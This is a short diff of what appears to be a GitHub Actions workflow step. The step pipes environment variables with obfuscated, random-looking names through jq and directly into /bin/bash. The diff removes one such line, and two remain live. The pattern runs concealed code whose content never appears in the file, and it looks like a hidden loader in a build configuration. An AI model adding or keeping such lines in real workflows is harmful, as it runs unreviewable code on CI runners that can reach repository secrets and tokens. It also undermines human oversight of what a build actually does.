@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$xddzn63118" | jq -r .uvq28 | /bin/bash
           echo $rs9529 | jq -r .u37 | /bin/bash
-          echo $zurkn901 | jq -r .chi0991 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
